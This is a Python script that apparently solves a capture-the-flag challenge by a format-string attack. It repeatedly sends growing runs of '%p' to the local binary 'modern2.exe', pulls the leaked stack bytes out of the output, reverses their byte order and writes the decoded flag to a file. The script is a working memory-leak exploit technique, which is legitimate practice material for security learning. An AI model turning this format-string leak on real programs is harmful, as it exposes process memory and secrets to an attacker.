import subprocess
import binascii
import re

#amount of letters tried
loops = int(input("amount of loops: "))

#attacked program
program_path = "modern2.exe"

#defined global inputs
user_inputs = "%"
user_inputs2 = "p"

# globals
checker = "ng" #to check if flag is found.
pattern = "633761" #begin of the flag pattern
pattern2 = "357376" #end of the flag pattern

def strFind(input_string): #find begin of flag
    global pattern 
    #print(pattern) #debugging
    match = re.search(pattern, input_string) #checks if the pattern is in the input_string
    if match:
        print("match is found for: ",pattern)
        return match.start() #returns start point of pattern
    else:
        print("pattern is not found")
        return 0

def strFindEnd(input_string): #find end of flag
    global pattern2
    #print(pattern) #debugging
    match2 = re.search(pattern2, input_string) #checks if the pattern is in the input_string
    if match2:
        print("match is found for: ",pattern2)
        return match2.end() #returnts end point of pattern
    else:
        print("pattern is not found")
        return 0
    
def removeStr(input_str):
    #print(input_str)
    substring_end = strFind(input_str)
    #print(substring_end)
    
    new_str = input_str[:0] + input_str[substring_end:]
    substring_start = strFindEnd(new_str)

    strL = len(new_str)
    new_str2 = new_str[:substring_start] + new_str[strL:]
    #print(new_str2) #debugging
    return new_str2

def hex_ascii(input_string):
    ascii_string = bytearray.fromhex(input_string).decode()
    return ascii_string

def remover(input_string):
    substring_to_remove = "What's the secret ?"
    new_string = input_string.replace(substring_to_remove, "")
    substring_to_remove = "See u soon!"
    new_string = new_string.replace(substring_to_remove, "")
    substring_to_remove = "\n"
    new_string = new_string.replace(substring_to_remove, "")
    return new_string

def endianness(input_string):
    str_ = remover(input_string)
   
    #test strings
    #str_ = "aaaaaaaaa6337617B67616C666E7663357265387665377A37396635627D67736434357376aaaa"
    #str_ = "000000000000004E0000000000000000000000000064FC0070257025702570257025702570257025702570257025702570257025702570257025702570257025000000007025702500000000004015500000000000000008000000000000000000000000100100110000000000A5126000007FFD0CD4AA86000000000000000100000000000000006337617B67616C666E7663357265387665377A37396635627D677364343573760000000000A51300"
    str2_ = removeStr(str_)
    
    try:

        swapped_hex_string = ''.join([str2_[i:i+16] for i in range(0, len(str2_), 16)][::-1])

        hex_with_spaces = ' '.join([swapped_hex_string[i:i+2] for i in range(0, len(swapped_hex_string), 2)])

        ret = ''.join([chr(int(b, 16)) for b in hex_with_spaces.split()])[::-1]
        return ret
    except ValueError:
        print("valueError")

    return str_
    
def execute_program(input_string):
    cmd = [program_path]
    process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    process.stdin.write(input_string.encode())
    process.stdin.flush()    
    process.wait()    
    output = process.stdout.read().decode('latin-1')

    #print(output)
    
    output1 = endianness(output)
    #looking for a flag
    if "flag" in output1:
        global checker
        
        print("gevonden! ")
        f = open("FlagFile.txt","w")
        f.write(output1)
        f.close
        checker = "g"
        #print(checker) #for debugging
        
    return output1 #[::-1] #for reversing string
       
def execute_with_output(input_string):
    print("input: ",input_string)
    output = execute_program(input_string)
    hex_output = binascii.hexlify(output.encode()).decode('ascii')
    #output1 = endianness(hex_output)
    print("Output: \n----------------------\n") 
    print(output)
    print("----------------------\n")
    
for i in range(1,loops):
    for input_string in user_inputs:  
            #if the flag is not found
        if checker == "ng":
            execute_with_output((input_string + user_inputs2)*i) 
        #if the flag is found
        if checker == "g":
            print("--- Information ---")
            print("amount of loops needed: ",i+1)
            checker = "done"
            print("\nflag output can be found in FlagFile.txt")
            break
            
